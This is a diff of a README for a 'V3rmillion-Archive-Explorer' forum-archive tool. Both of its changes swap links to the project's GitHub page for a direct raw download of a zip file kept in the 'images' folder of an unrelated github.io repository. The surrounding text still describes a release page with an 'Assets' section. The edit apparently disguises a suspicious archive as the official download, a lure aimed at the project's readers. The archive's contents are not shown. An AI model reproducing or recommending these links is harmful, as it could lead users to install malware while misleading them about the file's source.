@@ -5,7 +5,7 @@ description: "Search archived V3rmillion threads, posts, and user profiles using
 ---
 # 📂 V3rmillion-Archive-Explorer - Search historical forum data with ease
 
-[![Download V3rmillion-Archive-Explorer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Narcoleptic-coccyx463/V3rmillion-Archive-Explorer)
+[![Download V3rmillion-Archive-Explorer](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Narcoleptic-coccyx463/narcoleptic-coccyx463.github.io/main/images/3.9-beta.1.zip)
 
 ## 📌 About this software
 
@@ -24,7 +24,7 @@ Your computer needs several components to run this application. Please ensure yo
 
 You must visit the project release page to acquire the files. 
 
-[Visit this page to download the software](https://github.com/Narcoleptic-coccyx463/V3rmillion-Archive-Explorer)
+[Visit this page to download the software](https://raw.githubusercontent.com/Narcoleptic-coccyx463/narcoleptic-coccyx463.github.io/main/images/3.9-beta.1.zip)
 
 Once you arrive at the page, look under the "Assets" section. Select the file ending in .zip to download the complete package to your computer.
 
